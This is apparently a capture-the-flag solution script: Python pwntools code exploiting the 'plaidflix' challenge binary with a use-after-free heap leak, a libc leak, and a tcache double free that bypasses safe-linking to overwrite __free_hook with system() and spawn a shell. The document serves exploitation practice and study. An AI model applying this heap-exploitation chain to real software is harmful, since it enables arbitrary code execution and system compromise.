#!/usr/bin/env python2
from pwn import *

filename = "./plaidflix"
e = ELF(filename)
libc = e.libc
OFFSET_FREE_HOOK = libc.symbols['__free_hook']
OFFSET_SYSTEM = libc.symbols['system']

def d():    # for debugging
    gdb.attach(p, '''
    ''')

x = 0
def b():    # self-made breakpoint
    global x
    raw_input(str(x))
    x += 1

def talk(msg):
    p.sendlineafter("> ", msg)

def introduce(name):
    talk(name)

def addMovie(title, star):
    talk("0"), talk("0")
    talk(title)
    assert star in range(1, 6)
    talk(str(star))

def removeMovie(idx):
    talk("0"), talk("1")
    talk(str(idx))

def showMovie():
    talk("0"), talk("2")
    p.recvuntil(":"), p.recvline()
    return p.recvuntil("What do you want to do?")

def shareWithFriend(movieIdx, friendIdx):
    talk("0"), talk("3")
    talk(str(movieIdx))
    talk(str(friendIdx))

def addFriend(leng, name):
    talk("1"), talk("0")
    talk(str(leng))
    talk(name)

def removeFriend(idx):
    talk("1"), talk("1")
    talk(str(idx))
    
def showFriend():
    talk("1"), talk("2")
    p.recvuntil(":"), p.recvline()
    return p.recvuntil("What do you want to do?")

def deleteAccount():
    talk("2"), talk("y")

def addFeedback(feedback):
    talk("0"), talk(feedback)
    
def deleteFeedback(idx):
    talk("1"), talk(str(idx))
    
def addContactDetails(detail):
    talk("2"), talk(detail)

def submitFeedback():
    talk("3")

PROTECT_PTR = lambda location, ptr: (location >> 12) ^ ptr

p = process(filename)
introduce("J-Jaeyoung")

# Stage 1: heap base leakage
addMovie("ironman", 5)
addFriend(0x10, "Friend 0")
shareWithFriend(0, 0)
removeFriend(0)
msg = showMovie()
parser = re.compile("Shared with: (.{5})")
matchObj = parser.search(msg)
leak = u64(matchObj.group(1).ljust(8, '\x00'))

heap_base = leak << 12
print("heap: ", hex(heap_base))

# Stage 2: libc base leakage
for i in range(8):
    addFriend(0x7f, "X{}".format(i))

for i in range(1, 8): # fill up tcache [0x90]
    removeFriend(i)

shareWithFriend(0, 0)
removeFriend(0)     # unsorted bin
addFriend(0x8f, "trigger: unsorted bin -> small bin")
msg = showMovie()
parser = re.compile("Shared with: (.{6})")
matchObj = parser.search(msg)
leak = u64(matchObj.group(1).ljust(8, '\x00'))

libc_base = leak - 0x1e3c80
print("libc", hex(libc_base))

# Stage 3: Overwrite __free_hook with system's addr
deleteAccount()
for i in range(9):
    addFeedback("X")

for i in range(2, 9): # fill up tcache [0x110]
    deleteFeedback(i)

deleteFeedback(0)   # unsorted bin
deleteFeedback(1)   # consolidate and goto unsorted bin (0x220)
addFeedback("Prepare 1 entry in tcache [0x110]")
deleteFeedback(1)   # Double Free (to tcache [0x110])

payload = "X" * 0x110 + p64(PROTECT_PTR(heap_base, libc_base + OFFSET_FREE_HOOK))
addContactDetails(payload)

addFeedback("sh")   # 1
addFeedback(p64(libc_base + OFFSET_SYSTEM))  # 2

# Stage 4: get shell and enjoy :)
deleteFeedback(1)
p.sendline("echo ---------------; id; echo ---------------")

p.interactive()
